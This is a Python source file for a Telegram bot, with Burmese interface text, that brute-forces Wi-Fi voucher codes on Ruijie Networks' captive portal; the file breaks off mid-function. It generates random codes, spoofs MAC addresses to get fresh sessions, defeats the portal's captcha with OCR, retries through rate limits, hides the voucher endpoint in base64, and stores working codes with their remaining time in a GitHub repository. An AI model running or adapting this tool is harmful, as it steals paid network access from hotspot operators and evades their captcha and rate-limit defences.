# ═══════════════════════════════════════════════════════════════════════════
#  VOUCHER BOT — Ruijie Captcha Update Support
#  Admin: 1626617395
# ═══════════════════════════════════════════════════════════════════════════
import asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
import logging
from urllib.parse import urlparse
import ipaddress

from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np

# ─── Logging ───────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("VoucherBot")

# ─── Environment variables ────────────────────────────────────────────────
BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
ADMIN_ID     = "1626617395"                            # ← hardcoded admin
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
REPO_NAME    = os.environ.get("REPO_NAME",    "")

ADMINS_EXTRA = []

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN env variable is required")

def is_admin(chat_id):
    sid = str(chat_id)
    if ADMIN_ID and sid == str(ADMIN_ID):
        return True
    return sid in ADMINS_EXTRA

GITHUB_ENABLED = all([GITHUB_TOKEN, REPO_OWNER, REPO_NAME])

# ─── Bot instance ─────────────────────────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN)

# ─── Global state ─────────────────────────────────────────────────────────
user_data        = {}
scan_tasks       = {}
success_texts    = {}
limited_texts    = {}
notify_setting   = {}
last_scan_params = {}
pending_brute    = {}
success_messages = {}
limited_messages = {}

SUCCESS_CODE = asyncio.Queue()

session    = None
_connector = None
CONCURRENCY  = 200          # ← Captcha ကြောင့် လျှော့ထားသည်
_voucher_sem = None
_start_time  = time.monotonic()

MAX_CONCURRENT_SCANS = 5
active_scans_count   = 0
active_scans_lock    = asyncio.Lock()

BATCH_SIZE = 200            # ← Captcha ကြောင့် လျှော့ထားသည်

BRUTE_MODES = {
    "1": {"name": "ဂဏန်းသီးသန့် (0-9)",         "charset": string.digits},
    "2": {"name": "အင်္ဂလိပ်စာလုံးအသေး (a-z)",    "charset": string.ascii_lowercase},
    "3": {"name": "အင်္ဂလိပ်စာလုံးအကြီး (A-Z)",   "charset": string.ascii_uppercase},
    "4": {"name": "စာလုံးအကြီး+အသေး (a-zA-Z)",    "charset": string.ascii_letters},
    "5": {"name": "စာလုံး+ဂဏန်း (a-z, 0-9)",     "charset": string.ascii_lowercase + string.digits},
}

# ─── Proxy (disabled) ─────────────────────────────────────────────────────
PAID_PROXIES = []
_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PAID_PROXIES:
        return None
    p = PAID_PROXIES[_proxy_index % len(PAID_PROXIES)]
    _proxy_index += 1
    return f"http://{p}"

# ─── Keep-alive web server ───────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", os.environ.get("BOT_PORT", 8099)))
    try:
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        logger.info(f"🌐 Web server started on port {port}")
    except OSError as e:
        logger.warning(f"Web server could not start: {e}")

# ─── GitHub helpers ──────────────────────────────────────────────────────
async def get_file_content(path):
    if not GITHUB_ENABLED:
        return {}, None
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status == 200:
                data = await r.json()
                content = base64.b64decode(data["content"]).decode("utf-8")
                return json.loads(content), data["sha"]
    except Exception as e:
        logger.debug(f"get_file_content: {e}")
    return {}, None

async def update_file_content(path, content, sha, message):
    if not GITHUB_ENABLED:
        return
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}",
               "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content, ensure_ascii=False).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha:
        payload["sha"] = sha
    try:
        async with session.put(url, headers=headers, json=payload,
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            return await r.text()
    except Exception as e:
        logger.debug(f"update_file_content: {e}")

async def github_sync_scheduler():
    if not GITHUB_ENABLED:
        logger.info("ℹ️ GitHub sync disabled")
        return
    while True:
        await asyncio.sleep(180)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if not items:
            continue
        try:
            results, sha = await get_file_content("result.json")
            for item in items:
                uid   = str(item["chat_id"])
                entry = item["entry"]
                results.setdefault(uid, [])
                existing = {e.get("code") for e in results[uid] if isinstance(e, dict)}
                if entry["code"] not in existing:
                    results[uid].append(entry)
            await update_file_content("result.json", results, sha, "Periodic Update")
            logger.info(f"📤 Synced {len(items)} entries to GitHub")
        except Exception as e:
            logger.warning(f"GitHub sync error: {e}")

async def load_saved_from_github(chat_id):
    if not GITHUB_ENABLED:
        return
    uid = str(chat_id)
    try:
        results, _ = await get_file_content("result.json")
        if uid in results:
            entries = results[uid]
            existing = success_texts.setdefault(chat_id, [])
            existing_codes = {e["code"] for e in existing}
            for e in entries:
                if isinstance(e, dict) and e.get("code") not in existing_codes:
                    existing.append(e)
                    existing_codes.add(e["code"])
                elif isinstance(e, str) and e not in existing_codes:
                    existing.append({"code": e, "session_id": "", "plan": "N/A"})
                    existing_codes.add(e)
    except Exception as e:
        logger.debug(f"load_saved_from_github: {e}")

# ─── Format helpers ─────────────────────────────────────────────────────
def _parse_seconds(val):
    try: secs = int(val)
    except Exception: return "N/A"
    if secs < 0: return "N/A"
    h = secs // 3600; m = (secs % 3600) // 60
    if h: return f"{h}h {m}m"
    if m: return f"{m}m"
    return f"{secs}s"

def _parse_minutes(val):
    try: total = int(val)
    except Exception: return "N/A"
    if total <= 0: return "0m"
    if total < 60: return f"{total}m"
    h = total // 60; m = total % 60
    if h < 24: return f"{h}h {m}m" if m else f"{h}h"
    d = h // 24; rh = h % 24
    if d < 30: return f"{d}d {rh}h" if rh else f"{d}d"
    mo = d // 30; rd = d % 30
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

async def get_balance(token):
    urls = [
        f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{token}",
    ]
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    for url in urls:
        try:
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json(content_type=None)
                candidates = [data]
                for k in ("result", "data"):
                    if isinstance(data, dict) and isinstance(data.get(k), dict):
                        candidates.append(data[k])
                for d in candidates:
                    if not isinstance(d, dict):
                        continue
                    for key in ("totalMinutes", "remainingMinutes", "remainMinutes",
                                "leftMinutes", "balance", "remaining"):
                        if d.get(key) is not None:
                            return _parse_minutes(d[key])
                    for key in ("remainingSeconds", "remainTime", "remainingTime",
                                "leftTime", "timeLeft"):
                        if d.get(key) is not None:
                            return _parse_seconds(d[key])
        except Exception as e:
            logger.debug(f"get_balance {url}: {e}")
    return "N/A"

def iter_codes(mode, length):
    charset = BRUTE_MODES[str(mode)]["charset"]
    while True:
        yield "".join(random.choice(charset) for _ in range(length))

def format_progress(checked, speed=0, found=0, target=None, mode=None, length=None):
    mode_name = BRUTE_MODES.get(str(mode), {}).get("name", "") if mode else ""
    lines = ["📋 Status: Running"]
    if mode_name: lines.append(f"🎯 Mode: {mode_name}")
    if length:    lines.append(f"📏 Length: {length}")
    lines += [
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target: lines.append(f"🏆 Target: {found}/{target}")
    return "\n".join(lines)

# ─── SSRF guard ─────────────────────────────────────────────────────────
def is_safe_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"): return False
        host = parsed.hostname or ""
        if not host: return False
        if host.lower() in ("localhost", "0.0.0.0"): return False
        try:
            addr = ipaddress.ip_address(host)
            if any([addr.is_loopback, addr.is_private, addr.is_link_local,
                    addr.is_reserved, addr.is_unspecified, addr.is_multicast]):
                return False
        except ValueError:
            pass
        return True
    except Exception:
        return False

# ─── CAPTCHA ────────────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode(".png", thresh)
    return _ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac   = [first] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r"(?<=mac=)[^&]+", new_mac, url)

async def get_session_id(sess, session_url, prev=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        "accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True,
                            timeout=aiohttp.ClientTimeout(total=15)) as req:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return m.group(1) if m else prev
    except Exception as e:
        logger.debug(f"get_session_id: {e}")
        return prev

async def Captcha_Image(sess, session_id):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "image/*,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    params = {"sessionId": session_id, "_t": str(time.time())}
    async with sess.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params, headers=headers, timeout=aiohttp.ClientTimeout(total=10),
    ) as req:
        return await req.read()

async def Varify_Captcha(sess, session_id, text):
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    }
    async with sess.post(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        headers=headers, json={"sessionId": session_id, "authCode": text},
        timeout=aiohttp.ClientTimeout(total=10),
    ) as req:
        data = await req.json(content_type=None)
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    if not is_safe_url(session_url):
        return False
    headers = {
        "accept": "text/html,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        async with session.get(session_url, allow_redirects=False, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=15)) as first:
            location = first.headers.get("Location", "")
            if location and is_safe_url(location):
                async with session.get(location, allow_redirects=False, headers=headers,
                                       timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    return "sessionId" in str(resp.url) or "sessionId" in location
            return "sessionId" in str(first.url) or "sessionId" in location
    except Exception as e:
        logger.error(f"check_session_url: {e}")
        return False

# ─── Core voucher check (with captcha retry) ─────────────────────────────
POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False):
    if not recheck:
        ct = scan_tasks.get(chat_id)
        if not ct or ct.get("scan_id") != scan_id:
            return None

    response   = None
    session_id = None

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30),
        ) as ts:
            session_id = await get_session_id(ts, session_url)
            if not session_id:
                continue

            # ── Captcha: 12 retries with fresh image each time ──
            auth_code = None
            for _ in range(12):
                try:
                    img  = await Captcha_Image(ts, session_id)
                    text = await Captcha_Text(img)
                    if text and await Varify_Captcha(ts, session_id, text):
                        auth_code = text
                        break
                except Exception:
                    continue
            if not auth_code:
                logger.warning(f"Captcha failed for session {session_id}, code={code}")
                continue

            if not recheck:
                ct = scan_tasks.get(chat_id)
                if not ct or ct.get("scan_id") != scan_id or ct.get("stop"):
                    return None

            data = {"accessCode": code, "sessionId": session_id,
                    "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with ts.post(POST_URL, json=data, headers=headers) as req:
                    response = await req.text()
                    logger.debug(f"[voucher] code={code} att={attempt+1} status={req.status} resp={response[:60]}")
            except Exception as e:
                logger.debug(f"perform_check post: {e}")
                return None

        if response and "request limited" in response:
            logger.warning(f"Rate limited on code={code}, retrying with new captcha ({attempt+1}/3)")
            await asyncio.sleep(2)
            continue
        break

    if not response:
        return None

    # ── SUCCESS ──
    if "logonUrl" in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data  = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            tm = re.search(r"token=(.*?)&", logon_url)
            token = tm.group(1) if tm else session_id
            fetched = await get_balance(token)
            if fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        entry = {"code": code, "session_id": session_id, "plan": plan_str}

        existing = success_texts.setdefault(chat_id, [])
        if code not in {e["code"] for e in existing}:
            existing.append(entry)
            await SUCCESS_CODE.put({"chat_id": chat_id, "entry": entry})

        if notify_setting.get(chat_id, True):
            code_line = "\n".join([f"`{i['code']}` – {i.get('plan', 'N/A')}"
                                   for i in success_texts[chat_id]])
            text = f"✅ Success Codes ({len(success_texts[chat_id])}):\n{code_line}"
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, text, parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=success_messages[chat_id],
                        text=text, parse_mode="Markdown")
            except Exception:
                pass
        return code

    # ── LIMITED ──
    elif "STA" in response:
        limited_texts.setdefault(chat_id, [])
        if code not in limited_texts[chat_id]:
            limited_texts[chat_id].append(code)

        if notify_setting.get(chat_id, True):
            limited_line = "\n".join(limited_texts[chat_id][-20:])
            text = f"⚠️ Limited Codes ({len(limited_texts[chat_id])}):\n{limited_line}"
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, text)
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=limited_messages[chat_id],
                        text=text)
            except Exception:
                pass

    return None

# ─── Brute-force runner ──────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id,
                          target=None, progress_msg=None):
    global _voucher_sem, active_scans_count
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    checked    = 0
    found      = 0
    scan_start = time.monotonic()
    code_iter  = iter_codes(mode, length)
    stop_reason = "completed"

    try:
        while True:
            ct = scan_tasks.get(chat_id)
            if not ct or ct.get("scan_id") != scan_id:
                stop_reason = "cancelled"
                return
            if ct.get("stop"):
                stop_reason = "stopped"
                return

            batch = [next(code_iter) for _ in range(BATCH_SIZE)]

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id)

            results = await asyncio.gather(*[_check(c) for c in batch],
                                            return_exceptions=True)

            for res in results:
                if res and not isinstance(res, Exception):
                    found += 1
                    if target and found >= target:
                        stop_reason = "target"
                        try:
                            await bot.edit_message_text(
                                chat_id=chat_id, message_id=progress_msg.message_id,
                                text=f"🎯 Target {target} ရောက်ပါပြီ!")
                        except Exception:
                            pass
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed   = (checked / elapsed * 60) if elapsed > 0 else 0
            text    = format_progress(checked, speed, found, target, mode, length)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    nm = await bot.send_message(chat_id, text)
                    progress_msg.message_id = nm.message_id
                except Exception:
                    pass

    except asyncio.CancelledError:
        stop_reason = "stopped"
        raise
    finally:
        if stop_reason in ("stopped", "cancelled"):
            last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target}
        scan_tasks.pop(chat_id, None)
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)

# ─── Keyboards ──────────────────────────────────────────────────────────
def kb_main():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔗 Setup URL",     callback_data="menu_setup"),
        InlineKeyboardButton("🎯 Brute Force",   callback_data="menu_brute"),
        InlineKeyboardButton("💎 Saved Codes",   callback_data="menu_saved"),
        InlineKeyboardButton("📊 Status",        callback_data="menu_status"),
        InlineKeyboardButton("🛑 Stop Scan",     callback_data="menu_stop"),
        InlineKeyboardButton("⚙️ Settings",      callback_data="menu_settings"),
    )
    return kb

def kb_modes():
    kb = InlineKeyboardMarkup(row_width=1)
    for mid, info in BRUTE_MODES.items():
        kb.add(InlineKeyboardButton(f"{mid}. {info['name']}", callback_data=f"mode_{mid}"))
    kb.add(InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main"))
    return kb

def kb_lengths(mode):
    kb = InlineKeyboardMarkup(row_width=5)
    for n in (4, 5, 6, 7, 8, 9, 10, 11, 12):
        kb.add(InlineKeyboardButton(str(n), callback_data=f"len_{mode}_{n}"))
    kb.add(InlineKeyboardButton("✏️ Custom (/brute)", callback_data=f"len_custom_{mode}"))
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_brute"))
    return kb

def kb_start(mode, length):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton(f"🚀 START ({length} chars)", callback_data=f"start_{mode}_{length}"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_brute"),
    )
    return kb

def kb_resume_prompt():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("▶️ Resume",   callback_data="resume_scan"),
        InlineKeyboardButton("🆕 New Scan", callback_data="new_scan"),
    )
    return kb

def kb_back():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main"))
    return kb

def kb_settings():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🔔 Notify ON/OFF", callback_data="toggle_notify"),
        InlineKeyboardButton("🗑 Delete Saved",  callback_data="delete_saved"),
        InlineKeyboardButton("♻️ Recheck Codes", callback_data="recheck_codes"),
        InlineKeyboardButton("🔙 Main Menu",     callback_data="menu_main"),
    )
    return kb

# ─── Shared action helpers ──────────────────────────────────────────────
async def _begin_scan(chat_id, mode, length, target, reply_target):
    global active_scans_count
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await bot.send_message(chat_id, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return

    async with active_scans_lock:
        if active_scans_count >= MAX_CONCURRENT_SCANS:
            await bot.send_message(
                chat_id,
                f"⚠️ Bot အလုပ်များနေသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။")
            return
        active_scans_count += 1

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.send_message(chat_id, "⚠️ Scan လုပ်နေဆဲ။ /stop ဦးသုံးပါ။")
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)
        return

    mode_name   = BRUTE_MODES[str(mode)]["name"]
    target_note = f" | Target: {target}" if target else ""
    progress_msg = await bot.send_message(
        chat_id,
        f"🔍 ရှာဖွေမှု စတင်သည်\n🎯 Mode: {mode_name}\n📏 Length: {length}{target_note}",
    )

    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(int(mode), length, chat_id,
                       user_data[chat_id]["session_url"],
                       scan_id, target, progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

async def _stop_scan(chat_id, reply_target=None):
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        if reply_target:
            await bot.send_message(chat_id, "⏹️ ရပ်ပြီးပါပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
    else:
        if reply_target:
            await bot.send_message(chat_id, "⚠️ ရပ်ရန် scan မရှိပါ။")

async def _show_saved(chat_id, edit_msg=None):
    await load_saved_from_github(chat_id)
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        text = "⚠️ ရှာတွေ့ထားသော code မရှိသေးပါ။"
    else:
        parts = []
        if success:
            parts.append(f"✅ Success Codes ({len(success)})")
            for item in success:
                parts.append(f"`{item['code']}` – {item.get('plan', 'N/A')}")
        if limited:
            parts.append(f"\n⚠️ Limited Codes ({len(limited)})")
            parts.extend(limited[-30:])
        text = "\n".join(parts)

    if edit_msg:
        try:
            await bot.edit_message_text(chat_id=chat_id,
                                         message_id=edit_msg.message_id,
                                         text=text[:4000],
                                         parse_mode="Markdown",
                                         reply_markup=kb_back())
            return
        except Exception:
            pass
    for i in range(0, len(text), 4000):
        await bot.send_message(chat_id, text[i:i+4000], parse_mode="Markdown")

async def _show_status(chat_id, edit_msg=None):
    data  = scan_tasks.get(chat_id)
    found = len(success_texts.get(chat_id, []))
    if not data or data["task"].done():
        text = f"⚠️ ရှာဖွေမှု မရှိပါ။\n💎 Found: {found}"
    else:
        uptime = int(time.monotonic() - _start_time)
        h, r = divmod(uptime, 3600); m, s = divmod(r, 60)
        text = f"📋 Running\n💎 Found: {found}\n⏱ Uptime: {h}h {m}m {s}s"

    if edit_msg:
        try:
            await bot.edit_message_text(chat_id=chat_id,
                                         message_id=edit_msg.message_id,
                                         text=text, reply_markup=kb_back())
            return
        except Exception:
            pass
    await bot.send_message(chat_id, text)

async def _do_recheck(chat_id):
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await bot.send_message(chat_id, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.send_message(chat_id, "⚠️ Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.send_message(chat_id, "⏳ Success codes ပြန်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        recode = await perform_check(user_data[chat_id]["session_url"],
                                      item["code"], chat_id, recheck=True)
        if recode:
            new_success.append(item)
    success_texts[chat_id] = new_success
    if new_success:
        await bot.send_message(chat_id, f"✅ Recheck ပြီး {len(new_success)} ခု ကျန်ပါသည်။")
    else:
        await bot.send_message(chat_id, "Recheck ပြီးပါပြီ။ Success code တစ်ခုမျှ မကျန်ပါ။")

# ─── Commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(message):
    chat_id = message.chat.id
    user_data.setdefault(chat_id, {})
    notify_setting.setdefault(chat_id, True)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    await bot.send_message(
        chat_id,
        f"✨ VOUCHER BOT ✨\n\n👤 {user_name}\n🆔 {chat_id}\n\nMenu မှ ရွေးချယ်ပါ။",
        reply_markup=kb_main())

@bot.message_handler(commands=["help"])
async def cmd_help(message):
    await bot.send_message(
        message.chat.id,
        "📖 Voucher Bot အသုံးပြုနည်း\n\n"
        "၁။ /setup <url>              – Session URL ထည့်ရန်\n"
        "၂။ /brute <mode> <len> [n]   – ရှာဖွေရန်\n"
        "      Mode: 1=0-9, 2=a-z, 3=A-Z, 4=a-zA-Z, 5=a-z0-9\n"
        "      ဥပမာ: /brute 1 6 5\n"
        "၃။ /stop /resume             – ရပ် / ဆက်\n"
        "၄။ /status /saved            – အခြေအနေ / ရလဒ်\n"
        "၅။ /delete_saved             – ရလဒ်ဖျက်\n"
        "၆။ /recheck                  – codes ပြန်စစ်\n"
        "၇။ /notify                   – Notification ON/OFF")

@bot.message_handler(commands=["setup"])
async def cmd_setup(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup <session_url>")
        return
    url = args[1].strip()
    chat_id = message.chat.id
    await bot.reply_to(message, "⏳ Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data.setdefault(chat_id, {})["session_url"] = url
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        pending_brute.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        await bot.reply_to(message,
            "✅ Session URL သိမ်းဆည်းပြီးပါပြီ!\n/brute ဖြင့် စတင်နိုင်ပါပြီ။",
            reply_markup=kb_main())
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည် (သို့) sessionId မတွေ့ပါ။")

@bot.message_handler(commands=["brute"])
async def cmd_brute(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "❌ No Permission")
        return

    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "🎯 Mode ရွေးပါ:", reply_markup=kb_modes())
        return

    mode_str = args[1]
    if mode_str not in BRUTE_MODES:
        await bot.reply_to(message, "❌ Mode မမှန်ပါ။ 1-5 အကြား ရွေးပါ။")
        return
    try:
        length = int(args[2])
        if not 1 <= length <= 20:
            raise ValueError
    except ValueError:
        await bot.reply_to(message, "❌ Length သည် 1-20 ကြား ဂဏန်းဖြစ်ရပါမည်။")
        return

    target = None
    if len(args) >= 4:
        try:
            target = int(args[3])
        except ValueError:
            await bot.reply_to(message, "❌ Target သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

    chat_id = message.chat.id
    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await bot.reply_to(message, "❌ /setup ဖြင့် Session URL ထည့်ပါ။")
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ ရှာဖွေမှု မပြီးသေးပါ။ /stop ဦးသုံးပါ။")
        return

    if chat_id in last_scan_params:
        pending_brute[chat_id] = {"mode": mode_str, "length": length, "target": target}
        prev = last_scan_params[chat_id]
        await bot.reply_to(
            message,
            f"ယခင် scan ရပ်ထားသည် (mode:{prev['mode']} length:{prev['length']}).\nပြန်စမလား, အသစ်စမလား?",
            reply_markup=kb_resume_prompt())
        return

    await _begin_scan(chat_id, mode_str, length, target, message)

@bot.message_handler(commands=["stop"])
async def cmd_stop(message):
    if not is_admin(message.chat.id): return
    await _stop_scan(message.chat.id, message)

@bot.message_handler(commands=["resume"])
async def cmd_resume(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "⚠️ ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await bot.reply_to(message, "▶️ ယခင် scan ပြန်စပါပြီ။")
    await _begin_scan(chat_id, params["mode"], params["length"], params["target"], message)

@bot.message_handler(commands=["status"])
async def cmd_status(message):
    if not is_admin(message.chat.id): return
    await _show_status(message.chat.id)

@bot.message_handler(commands=["saved"])
async def cmd_saved(message):
    if not is_admin(message.chat.id): return
    await _show_saved(message.chat.id)

@bot.message_handler(commands=["delete_saved"])
async def cmd_delete_saved(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    cnt = len(success_texts.get(chat_id, [])) + len(limited_texts.get(chat_id, []))
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    await bot.reply_to(message, f"✅ Code {cnt} ခု ဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=["notify"])
async def cmd_notify(message):
    if not is_admin(message.chat.id): return
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, True)
    state = "ON ✅" if notify_setting[chat_id] else "OFF ❌"
    await bot.reply_to(message, f"📢 Notification: {state}")

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(message):
    if not is_admin(message.chat.id): return
    await _do_recheck(message.chat.id)

# ─── Callbacks ─────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    data    = call.data
    chat_id = call.message.chat.id

    if not is_admin(chat_id):
